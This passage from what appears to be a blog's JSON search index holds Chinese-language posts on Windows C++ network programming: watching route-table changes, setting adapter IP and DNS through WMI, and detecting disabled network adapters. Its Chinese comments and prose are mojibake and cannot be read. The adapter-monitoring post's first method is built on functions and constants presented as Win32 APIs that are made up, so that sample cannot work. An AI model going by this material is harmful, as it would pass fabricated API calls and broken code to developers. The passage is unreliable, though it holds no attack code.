&lt;iphlpapi.h&gt;#pragma comment(lib, &quot;iphlpapi.lib&quot;)#pragma comment(lib, &quot;ws2_32.lib&quot;)using namespace std;#define NAMEPRINTFORMAT(X) std::left &lt;&lt; setw(60)&lt;&lt; #X &lt;&lt; &quot;\\t\\t&quot; &lt;&lt; Xstd::string ipToString(DWORD dwIP)&#123; std::string strDestIp = &quot;&quot;; std::string strMaskIp = &quot;&quot;; struct in_addr network; network.S_un.S_addr = dwIP; //ä¸ºs_addrèµ‹å€¼--ç½‘ç»œå­—èŠ‚åº strDestIp = inet_ntoa(network); return strDestIp;&#125;void CALLBACK RouteChanged1(void* CallerContext, PMIB_IPFORWARD_ROW2 Table, MIB_NOTIFICATION_TYPE NotificationType)&#123; using context = void(*)(DWORD); context ctx = (context)CallerContext; auto PrintTable = [](MIB_IPFORWARD_ROW2 table) &#123; cout &lt;&lt; &quot;---------------&quot; &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Info.IfType) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Info.NetLuidIndex) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Info.Reserved) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Value) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceIndex) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.si_family) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; &quot;\\t&quot; &lt;&lt; ipToString(table.DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_family) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_port) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_zero) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_addr.u.Byte) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_addr.u.Word) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_family) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_flowinfo) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_port) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_id) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_struct.Level) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_struct.Value) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_struct.Zone) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.NextHop.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; &quot;\\t&quot; &lt;&lt; ipToString(table.NextHop.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.NextHop.Ipv6.sin6_addr.u.Byte) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.NextHop.Ipv6.sin6_addr.u.Word) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.SitePrefixLength) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.ValidLifetime) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.PreferredLifetime) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Metric) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Protocol) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Loopback) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.AutoconfigureAddress) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Immortal) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Age) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Origin) &lt;&lt; endl; cout &lt;&lt; &quot;---------------&quot; &lt;&lt; endl &lt;&lt; endl; &#125;; // å¤„ç†è·¯ç”±è¡¨å˜æ›´é€šçŸ¥ switch (NotificationType) &#123; case MibParameterNotification: cout &lt;&lt; &quot;1-- å‚æ•°è¢«æ›´æ”¹&quot; &lt;&lt; endl; break; case MibAddInstance: cout &lt;&lt; &quot;2-- æ·»åŠ &quot; &lt;&lt; endl; PrintTable(*Table); ctx(Table-&gt;DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr); break; case MibDeleteInstance: cout &lt;&lt; &quot;3-- åˆ é™¤&quot; &lt;&lt; endl; PrintTable(*Table); ctx(Table-&gt;DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr); break; case MibInitialNotification: cout &lt;&lt; &quot;4-- å‡½æ•°å·²æ³¨å†Œ&quot; &lt;&lt; endl; break; default: break; &#125;&#125;void checkIsMyRoute (DWORD ip)&#123; cout &lt;&lt; NAMEPRINTFORMAT(ipToString(ip)) &lt;&lt; endl;&#125;;void main()&#123; HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); HANDLE hNotify = NULL; PVOID callerContext = static_cast&lt;PVOID&gt;(&amp;checkIsMyRoute); BOOLEAN bSuccess = TRUE; ULONG pdwPrevNotified = 0; if (callerContext != nullptr &amp;&amp; NotifyRouteChange2(AF_UNSPEC, &amp;RouteChanged1, callerContext, bSuccess, &amp;hNotify) != NO_ERROR) &#123; printf(&quot;Could not register for route change notifications\\n&quot;); return ; &#125; while (TRUE) &#123; DWORD dwWait = WaitForSingleObject(hNotify, INFINITE); if (dwWait == WAIT_OBJECT_0) &#123; // æ¥æ”¶åˆ°å¼‚æ­¥é€šçŸ¥ï¼Œå¤„ç†ç»“æœ break; &#125; &#125; // å–æ¶ˆç›‘æ§ CancelMibChangeNotify2(hNotify); CloseHandle(hNotify); return ;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"ç›‘æ§","slug":"ç›‘æ§","permalink":"https://hodlyounger.github.io/tags/%E7%9B%91%E6%8E%A7/"},{"name":"ç½‘ç»œç¼–ç¨‹/route","slug":"ç½‘ç»œç¼–ç¨‹-route","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-route/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘æ“ä½œç½‘å¡ç±»","date":"2023-10-27T01:24:02.075Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘æ“ä½œç½‘å¡ç±»/","text":"æ¦‚è¿°ï¼šåœ¨ windows ç¯å¢ƒä¸‹ï¼Œä½¿ç”¨ wmi ä¿®æ”¹ç½‘å¡ ip+dns main.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//main.cpp:#include &lt;iostream&gt;#include &lt;locale&gt;#include &lt;string&gt;#include &lt;codecvt&gt;#include &quot;net_config.h&quot;#pragma execution_character_set(&quot;utf-8&quot;)using namespace std;int main()&#123; std::locale::global(std::locale(&quot;&quot;)); NetConfig config; //ç½‘å¡çš„keyå¯ä»¥ä»æ³¨å†Œè¡¨è·å–, è·¯å¾„: è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\ config.set_key(&quot;&#123;cd574b17-73e1-42df-a50c-f95d7f15c1d0&#125;&quot;); //è®¾ç½®é™æ€ipä¹‹å‰è¦è°ƒç”¨ä¸‹enable_dhcp, å¯ä»¥æŠŠä»¥å‰è®¾ç½®çš„ipå’Œç½‘å…³éƒ½æ¸…ç©º, å¦åˆ™æ³¨å†Œè¡¨ä¼šæœ‰å¤šä¸ªipä¿¡æ¯ if (config.enable_dhcp()) &#123; cout &lt;&lt; &quot;enable_dhcp success&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;error code: &quot; &lt;&lt; config.get_last_error_code() &lt;&lt; endl; &#125; if (config.set_ip_config(&quot;192.168.1.100&quot;, &quot;255.255.255.0&quot;, &quot;192.168.1.1&quot;)) &#123; cout &lt;&lt; &quot;set_ip_config success&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;error code: &quot; &lt;&lt; config.get_last_error_code() &lt;&lt; endl; &#125; if (config.set_dns(&quot;255.255.255.0&quot;, &quot;&quot;)) &#123; cout &lt;&lt; &quot;set_dns success&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;error code: &quot; &lt;&lt; config.get_last_error_code() &lt;&lt; endl; &#125; cin.get(); return 0;&#125; net_config.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//net_config.h#pragma once#include &lt;string&gt;#include &lt;memory&gt;#include &lt;vector&gt;#include &lt;Wbemidl.h&gt;class NetConfig&#123;public: NetConfig() &#123;&#125; NetConfig(const std::string &amp;key) :key_(key)&#123; &#125; ~NetConfig(); //è®¾ç½®ç½‘ç»œè®¾å¤‡GUID void set_key(const std::string &amp;key) &#123; clear(); key_ = key; &#125; //å¯ç”¨DHCP bool enable_dhcp(); //å¯åŠ¨é™æ€IP,è®¾ç½®IP,æ©ç ,ç½‘å…³ bool set_ip_config(const std::string &amp;ip, const std::string &amp;mask, const std::string &amp;gateway); bool set_ip_config(const std::string &amp;ip, const std::string &amp;mask); //è®¾ç½®ç½‘å…³ bool set_gateway(const std::string &amp;gateway); //è®¾ç½®DNSåœ°å€ bool set_dns(const std::string &amp;default_dns, const std::string &amp;backup_dns); //è®¾ç½®è‡ªåŠ¨DNS bool set_auto_dns(); int get_last_error_code()const &#123; return last_error_code_; &#125; void clear();private: NetConfig(const NetConfig &amp;rhs) = delete; NetConfig &amp;operator = (const NetConfig &amp;rhs) = delete;private: //åˆå§‹åŒ– bool init(); //åˆ›å»ºCOMæ•°ç»„ std::shared_ptr&lt;SAFEARRAY&gt; create_SAFEARRAY(const std::vector&lt;std::string&gt; &amp;args); bool set_dns_base(bool is_auto, const std::string &amp;default_dns, const std::string &amp;backup_dns); bool exec_method(const wchar_t *method, IWbemClassObject *params_instance);private: std::string key_; bool is_init_ = false; IWbemLocator* p_instance_ = NULL; IWbemServices* p_service_ = NULL; IEnumWbemClassObject* p_enum_ = NULL; IWbemClassObject *p_obj_ = NULL; IWbemClassObject *p_config = NULL; VARIANT path_; int last_error_code_ = 0;&#125;; net_config.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367//net_config.cpp#include &quot;net_config.h&quot;#include &lt;codecvt&gt;#include &lt;atlbase.h&gt;#include &lt;comutil.h&gt;#ifdef _DEBUG#include &lt;iostream&gt;#endif#pragma comment(lib, &quot;wbemuuid.lib&quot;)#pragma comment(lib, &quot;comsuppw.lib&quot;)#pragma execution_character_set(&quot;utf-8&quot;)using namespace std;NetConfig::~NetConfig()&#123; clear();&#125;bool NetConfig::enable_dhcp()&#123; if (!init()) return false; return exec_method(L&quot;EnableDHCP&quot;, NULL);&#125;bool NetConfig::set_ip_config(const std::string &amp; ip, const std::string &amp; mask, const std::string &amp; gateway)&#123; if (set_ip_config(ip, mask)) &#123; return set_gateway(gateway); &#125; return false;&#125;bool NetConfig::set_ip_config(const std::string &amp; ip, const std::string &amp; mask)&#123; bool rt = false; if (!init()) return rt; IWbemClassObject *params = NULL; IWbemClassObject *paramsInst = NULL; p_config-&gt;GetMethod(_bstr_t(&quot;EnableStatic&quot;), 0, &amp;params, NULL); params-&gt;SpawnInstance(0, &amp;paramsInst); auto p1 = create_SAFEARRAY(&#123; ip &#125;); VARIANT paramVt; paramVt.vt = VT_ARRAY | VT_BSTR; paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;IPAddress&quot;, 0, &amp;paramVt, NULL); p1 = create_SAFEARRAY(&#123; mask &#125;); paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;SubnetMask&quot;, 0, &amp;paramVt, NULL); rt = exec_method(L&quot;EnableStatic&quot;, paramsInst); if (params) &#123; params-&gt;Release(); &#125; return rt;&#125;bool NetConfig::set_dns(const std::string &amp; default_dns, const std::string &amp; backup_dns)&#123; return set_dns_base(false, default_dns, backup_dns);&#125;bool NetConfig::set_auto_dns()&#123; return set_dns_base(true, &quot;&quot;, &quot;&quot;);&#125;bool NetConfig::set_gateway(const std::string &amp; gateway)&#123; bool rt = false; if (!init()) return rt; IWbemClassObject *params = NULL; IWbemClassObject *paramsInst = NULL; p_config-&gt;GetMethod(_bstr_t(&quot;SetGateways&quot;), 0, &amp;params, NULL); params-&gt;SpawnInstance(0, &amp;paramsInst); auto p1 = create_SAFEARRAY(&#123; gateway &#125;); VARIANT paramVt; paramVt.vt = VT_ARRAY | VT_BSTR; paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;DefaultIPGateway&quot;, 0, &amp;paramVt, NULL); paramVt.vt = VT_UINT; paramVt.uintVal = 1; paramsInst-&gt;Put(L&quot;GatewayCostMetric&quot;, 0, &amp;paramVt, NULL); rt = exec_method(L&quot;SetGateways&quot;, paramsInst); if (params) &#123; params-&gt;Release(); &#125; return rt;&#125;void NetConfig::clear()&#123; if (p_config) &#123; p_config-&gt;Release(); p_config = nullptr; &#125; if (p_obj_) &#123; p_obj_-&gt;Release(); p_obj_ = nullptr; &#125; if (p_enum_) &#123; p_enum_-&gt;Release(); p_enum_ = nullptr; &#125; if (p_service_) &#123; p_service_-&gt;Release(); p_service_ = nullptr; &#125; if (p_instance_) &#123; p_instance_-&gt;Release(); p_instance_ = nullptr; &#125; if (is_init_) &#123; CoUninitialize(); &#125; is_init_ = false;&#125;bool NetConfig::init()&#123; if (is_init_) &#123; return true; &#125; // Step 1: Initialize COM. HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoInitializeEx failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; /* // Step 2: Set general COM security levels hres = CoInitializeSecurity( NULL, -1, // COM negotiates service NULL, // Authentication services NULL, // Reserved RPC_C_AUTHN_LEVEL_DEFAULT, // Default authentication RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation NULL, // Authentication info EOAC_NONE, // Additional capabilities NULL // Reserved ); //ASSERT_THROW(SUCCEEDED(hres), &quot;CoInitializeSecurity failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoInitializeSecurity failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; */ // Step 3: Obtain the initial locator to WMI hres = CoCreateInstance( CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&amp;p_instance_); //ASSERT_THROW(SUCCEEDED(hres), &quot;CoCreateInstance failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoCreateInstance failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // Step 4: Connect to the local root\\cimv2 namespace and obtain pointer pSvc to make IWbemServices calls. hres = p_instance_-&gt;ConnectServer( _bstr_t(L&quot;ROOT\\\\CIMV2&quot;), NULL, NULL, 0, NULL, 0, 0, &amp;p_service_ ); //ASSERT_THROW(SUCCEEDED(hres), &quot;ConnectServer failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;ConnectServer failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // Step 5: Set security levels for the proxy hres = CoSetProxyBlanket( p_service_, // Indicates the proxy to set RPC_C_AUTHN_WINNT, // RPC_C_AUTHN_xxx RPC_C_AUTHZ_NONE, // RPC_C_AUTHZ_xxx NULL, // Server principal name RPC_C_AUTHN_LEVEL_CALL, // RPC_C_AUTHN_LEVEL_xxx RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx NULL, // client identity EOAC_NONE // proxy capabilities ); //ASSERT_THROW(SUCCEEDED(hres), &quot;CoSetProxyBlanket failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoSetProxyBlanket failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // é€šè¿‡é€‚é…å™¨åç§°æ¥æ‰¾åˆ°æŒ‡å®šçš„é€‚é…å™¨å¯¹è±¡. CComBSTR TheQuery = L&quot;SELECT * FROM Win32_NetworkAdapterConfiguration WHERE SettingID = \\&quot;&quot;; std::wstring_convert&lt;std::codecvt_utf8_utf16&lt;wchar_t&gt;, wchar_t&gt; conversion; TheQuery += conversion.from_bytes(key_).c_str(); TheQuery += L&quot;\\&quot;&quot;; hres = p_service_-&gt;ExecQuery( //SysAllocString(L&quot;WQL&quot;), L&quot;WQL&quot;, TheQuery, WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY, NULL, &amp;p_enum_); //ASSERT_THROW(SUCCEEDED(hres), &quot;ExecQuery failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;ExecQuery failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // Get the adapter object. ULONG num = 0; hres = p_enum_-&gt;Next(WBEM_INFINITE, 1, &amp;p_obj_, &amp;num); //ASSERT_THROW(SUCCEEDED(hres), &quot;Next failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;Next failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; //ASSERT_THROW(0 &lt; num, &quot;Next failed&quot;); if (num &lt; 1) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;Next failed num &lt; 1&quot; &lt;&lt; endl;#endif return false; &#125; VariantInit(&amp;path_); hres = p_obj_-&gt;Get(L&quot;__PATH&quot;, 0, &amp;path_, NULL, NULL); //ASSERT_THROW(SUCCEEDED(hres), &quot;Get path failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;Get failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; hres = p_service_-&gt;GetObject(_bstr_t(L&quot;Win32_NetworkAdapterConfiguration&quot;), 0, NULL, &amp;p_config, NULL); //ASSERT_THROW(SUCCEEDED(hres), &quot;GetObject Win32_NetworkAdapterConfiguration failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;GetObject failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; is_init_ = true; return true;&#125;std::shared_ptr&lt;SAFEARRAY&gt; NetConfig::create_SAFEARRAY(const std::vector&lt;std::string&gt; &amp;args)&#123; SAFEARRAY *psa = SafeArrayCreateVector(VT_BSTR, 0, args.size()); long idx[] = &#123; 0 &#125;; for (int i = 0; i &lt; args.size(); i++) &#123; std::wstring_convert&lt;std::codecvt_utf8_utf16&lt;wchar_t&gt;, wchar_t&gt; conversion; BSTR ip = SysAllocString(conversion.from_bytes(args[i]).c_str()); idx[0] = i; if (FAILED(SafeArrayPutElement(psa, idx, ip))) &#123; return (false); &#125; SysFreeString(ip); &#125; return shared_ptr&lt;SAFEARRAY&gt;(psa, [](SAFEARRAY *psa) &#123;SafeArrayDestroy(psa); &#125;);&#125;bool NetConfig::set_dns_base(bool is_auto, const std::string &amp; default_dns, const std::string &amp; backup_dns)&#123; bool rt = false; if (!init()) return rt; IWbemClassObject *params = NULL; IWbemClassObject *paramsInst = NULL; p_config-&gt;GetMethod(_bstr_t(&quot;SetDNSServerSearchOrder&quot;), 0, &amp;params, NULL); params-&gt;SpawnInstance(0, &amp;paramsInst); shared_ptr&lt;SAFEARRAY&gt; p1; if (is_auto) &#123; paramsInst-&gt;Put(L&quot;DNSServerSearchOrder&quot;, 0, NULL, NULL); &#125; else &#123; if (backup_dns.size()) &#123; p1 = create_SAFEARRAY(&#123; default_dns, backup_dns &#125;); &#125; else &#123; p1 = create_SAFEARRAY(&#123; default_dns &#125;); &#125; VARIANT paramVt; paramVt.vt = VT_ARRAY | VT_BSTR; paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;DNSServerSearchOrder&quot;, 0, &amp;paramVt, NULL); &#125; rt = exec_method(L&quot;SetDNSServerSearchOrder&quot;, paramsInst); if (params) &#123; params-&gt;Release(); &#125; return rt;&#125;bool NetConfig::exec_method(const wchar_t * method, IWbemClassObject * params_instance)&#123; bool rt = false; IWbemClassObject *results = NULL; auto res = p_service_-&gt;ExecMethod(path_.bstrVal, _bstr_t(method), 0, NULL, params_instance, &amp;results, NULL); if (SUCCEEDED(res)) &#123; VARIANT vtRet; VariantInit(&amp;vtRet); if (!FAILED(results-&gt;Get(L&quot;ReturnValue&quot;, 0, &amp;vtRet, NULL, 0))) &#123; if (vtRet.uintVal == 0 || vtRet.uintVal == 1) &#123; rt = true; &#125; else &#123; last_error_code_ = vtRet.uintVal;#ifdef _DEBUG wcout &lt;&lt; method &lt;&lt; &quot; failed, result: &quot; &lt;&lt; last_error_code_ &lt;&lt; endl;#endif &#125; &#125;#ifdef _DEBUG else &#123; cout &lt;&lt; &quot;ExecMethod Get ReturnValue failed: &quot; &lt;&lt; res &lt;&lt; endl; &#125;#endif VariantClear(&amp;vtRet); results-&gt;Release(); &#125;#ifdef _DEBUG else &#123; cout &lt;&lt; &quot;ExecMethod failed: &quot; &lt;&lt; res &lt;&lt; endl; &#125;#endif if (params_instance) &#123; params_instance-&gt;Release(); &#125; return rt;&#125;","tags":[{"name":"windows/ç½‘å¡","slug":"windows-ç½‘å¡","permalink":"https://hodlyounger.github.io/tags/windows-%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘ç›‘æ§ç½‘å¡äº‹ä»¶","date":"2023-10-27T01:24:02.075Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘ç›‘æ§ç½‘å¡ç¦ç”¨äº‹ä»¶/","text":"æ¦‚è¿°ï¼šç›‘æ§ç½‘å¡è¢«ç¦ç”¨äº‹ä»¶ã€‚ æ–¹æ³•ä¸€ å¯ä»¥ä½¿ç”¨Win32 APIä¸­çš„ NotifySubscribeCallouts å’Œ NotifyRegisterNetEvent api å‡½æ•°æ¥ç›‘æ§ç½‘ç»œé€‚é…å™¨çŠ¶æ€çš„æ”¹å˜ï¼ŒåŒ…æ‹¬è¢«ç¦ç”¨çš„äº‹ä»¶ã€‚ å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š ä½¿ç”¨NotifySubscribeCalloutså‡½æ•°æ¥æ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå½“ç½‘ç»œé€‚é…å™¨çŠ¶æ€æ”¹å˜æ—¶ä¼šè°ƒç”¨è¯¥å‡½æ•°ã€‚ åœ¨å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨NotifyRegisterNetEventå‡½æ•°æ¥æ³¨å†Œä¸€ä¸ªç½‘ç»œäº‹ä»¶ï¼Œæ¯”å¦‚ç½‘ç»œé€‚é…å™¨è¢«ç¦ç”¨ã€‚ ç›‘å¬å›è°ƒå‡½æ•°ä¸­ä¼ é€’çš„äº‹ä»¶ç±»å‹ï¼Œå½“äº‹ä»¶ç±»å‹ä¸ºè¢«ç¦ç”¨æ—¶ï¼Œæ‰§è¡Œè‡ªå·±çš„é€»è¾‘å¤„ç†ã€‚ ç¤ºä¾‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;ipexport.h&gt;using namespace std;BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);void CALLBACKNetEventCallback(PVOID pCallerContext, ULONG NotificationType, PVOID Notification);int main()&#123; // æ³¨å†Œæ§åˆ¶äº‹ä»¶å¤„ç†å‡½æ•° SetConsoleCtrlHandler(HandlerRoutine, TRUE); HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); HANDLE hWaitableHandle[2] = &#123; hEvent, INVALID_HANDLE_VALUE &#125;; // æ³¨å†Œç½‘ç»œäº‹ä»¶å›è°ƒå‡½æ•° DWORD dwFlags = NOTIFY_FILTER_INTERFACE_CHANGE | NOTIFY_FILTER_DRIVER_LOADED; HMODULE hModule = NULL; PVOID pCallerContext = (PVOID)hEvent; HANDLE hNotifyObject = NULL; NotifySubscribeCallouts(dwFlags, NetEventCallback, pCallerContext, hModule, &amp;hNotifyObject); // ç­‰å¾…äº‹ä»¶ DWORD dwWaitResult; do &#123; dwWaitResult = WaitForMultipleObjects(2, hWaitableHandle, FALSE, INFINITE); &#125; while (dwWaitResult != WAIT_OBJECT_0); // å–æ¶ˆè®¢é˜…å¹¶å…³é—­äº‹ä»¶å¥æŸ„ NotifyUnsubscribeCallouts(hNotifyObject); CloseHandle(hEvent); return 0;&#125;BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)&#123; switch (dwCtrlType) &#123; case CTRL_CLOSE_EVENT: printf(&quot; Close signal received.&quot;); return TRUE; default: return FALSE; &#125;&#125;void CALLBACK NetEventCallback(PVOID pCallerContext, ULONG NotificationType, PVOID Notification)&#123; switch (NotificationType) &#123; case NOTIFY_INTERFACE_ARRIVAL: printf(&quot; Interface arrival.&quot;); break; case NOTIFY_INTERFACE_REMOVAL: printf(&quot; Interface removal.&quot;); break; case NOTIFY_INTERFACE_ENABLED: printf(&quot; Interface enabled.&quot;); break; case NOTIFY_INTERFACE_DISABLED: printf(&quot; Interface disabled.&quot;); break; default: printf(&quot; Unknown notification type.&quot;); break; &#125; PIP_INTERFACE_INFO pIfInfo = (PIP_INTERFACE_INFO)Notification; // ç›‘å¬ç½‘å¡è¢«ç¦ç”¨äº‹ä»¶ if (NotificationType == NOTIFY_INTERFACE_DISABLED) &#123; printf(&quot; Interface % ws has been disabled.&quot;, pIfInfo-&gt;Adapter[0].Name); &#125;&#125; æ³¨æ„äº‹é¡¹ï¼š å¦‚æœéœ€è¦ä½¿ç”¨NotifyRegisterNetEventå‡½æ•°ï¼Œéœ€è¦å°†åº”ç”¨ç¨‹åºç¼–è¯‘ä¸ºé©±åŠ¨ç¨‹åºæˆ–ç³»ç»ŸæœåŠ¡ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚ å›è°ƒå‡½æ•°ä¸­ä¸èƒ½é˜»å¡æˆ–è¿›è¡Œè€—æ—¶æ“ä½œï¼Œå› ä¸ºè¿™ä¼šå½±å“ç³»ç»ŸåŠŸèƒ½çš„æ­£å¸¸è¿ä½œã€‚ å¯ä»¥ä½¿ç”¨SetConsoleCtrlHandlerå‡½æ•°æ³¨å†Œæ§åˆ¶äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œä»¥ä¾¿åœ¨æ”¶åˆ°æ§åˆ¶äº‹ä»¶æ—¶å¯ä»¥åŠæ—¶é€€å‡ºç¨‹åºã€‚ æ–¹æ³•äºŒ å‚è€ƒæ³¨å†Œè®¾å¤‡é€šçŸ¥ - Win32 apps | Microsoft Learn è¦è·å– Windows 